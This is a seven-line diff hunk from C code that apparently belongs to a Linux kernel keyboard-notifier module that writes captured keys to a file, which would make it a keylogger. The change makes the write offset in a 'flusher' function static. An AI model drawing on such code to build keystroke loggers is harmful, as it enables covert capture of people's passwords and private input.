@@ -148,7 +148,7 @@ void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
 
 int flusher ( void *data )
 {
-    loff_t pos = 0;
+    static loff_t pos = 0;
     mm_segment_t old_fs;
     ssize_t ret;
 
